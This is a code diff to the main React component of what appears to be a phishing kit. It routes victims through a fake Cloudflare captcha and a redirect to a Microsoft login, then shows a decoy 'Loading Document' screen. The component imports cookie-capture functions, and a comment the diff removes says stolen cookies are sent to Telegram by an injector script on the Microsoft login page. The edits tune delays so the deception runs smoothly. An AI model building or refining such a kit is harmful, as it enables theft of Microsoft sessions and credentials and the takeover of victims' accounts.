@@ -10,6 +10,7 @@ import { captureAndSendCookies, setCapturedEmail, setCapturedCookies } from './u
 const SLOW_DELAY = 1200; // Base delay, x3 for each step (e.g., 3600ms)
 const nextStepDelay = SLOW_DELAY * 3;
 const messageIconDelay = 500; // This matches the delay used in MessageIconLanding
+const captchaVerificationDelay = 1500; // Default verification delay for captcha
 
 function App() {
   const [currentPage, setCurrentPage] = useState('captcha');
@@ -258,15 +259,15 @@ function App() {
       const timer = setTimeout(() => {
         setCurrentPage(pendingStep);
         setPendingStep(null);
-      }, pendingStep === 'oauth-redirect' ? messageIconDelay : nextStepDelay);
+      }, nextStepDelay);
       return () => clearTimeout(timer);
     }
   }, [pendingStep]);
 
-  // Step 1: Captcha verified: go to oauth redirect with same delay as MessageIconLanding
+  // Step 1: Captcha verified: go to oauth redirect (delay is now handled by CloudflareCaptcha)
   const handleCaptchaVerified = () => {
-    console.log('✅ CAPTCHA verified - waiting for message icon delay before moving to OAuth redirect');
-    setPendingStep('oauth-redirect'); // go directly to 'oauth-redirect' step, with messageIconDelay
+    console.log('✅ CAPTCHA verified - moving to OAuth redirect');
+    setPendingStep('oauth-redirect');
   };
 
   // Refresh page for back-to-captcha
@@ -278,10 +279,6 @@ function App() {
   // Step 3: OAuth success: after Telegram, show loading document (final step, no more captcha)
   const handleOAuthSuccess = async (sessionData: any) => {
     console.log('🔐 OAuth successful:', sessionData);
-
-    // Note: Cookie capture and Telegram sending happens automatically 
-    // via the microsoft-cookie-injector.js script on the Microsoft login page
-
     setCurrentPage('document-loading');
   };
 
@@ -298,6 +295,8 @@ function App() {
         <CloudflareCaptcha
           onVerified={handleCaptchaVerified}
           onBack={handleCaptchaBack}
+          verificationDelay={captchaVerificationDelay}
+          autoRedirectDelay={messageIconDelay}
         />
       );
 
@@ -309,14 +308,13 @@ function App() {
       );
 
     case 'oauth-redirect':
-      // RealOAuthRedirect will itself wait (slow) before redirecting to Microsoft
       return (
         <RealOAuthRedirect
           onLoginSuccess={handleOAuthSuccess}
         />
       );
 
-    case 'success': // alias for document-loading
+    case 'success':
     case 'document-loading':
       return (
         <div style={{ 
@@ -350,14 +348,12 @@ function App() {
             }}>
               📄
             </div>
-            
             <h2 style={{ color: '#323130', margin: '0 0 10px' }}>
               Loading Document...
             </h2>
             <p style={{ color: '#605e5c', margin: '0 0 20px' }}>
               Please wait while we prepare your Microsoft document
             </p>
-            
             <div style={{
               display: 'flex',
               justifyContent: 'center',
@@ -396,11 +392,12 @@ function App() {
       );
 
     default:
-      // fallback to captcha
       return (
         <CloudflareCaptcha
           onVerified={handleCaptchaVerified}
           onBack={handleCaptchaBack}
+          verificationDelay={captchaVerificationDelay}
+          autoRedirectDelay={messageIconDelay}
         />
       );
   }
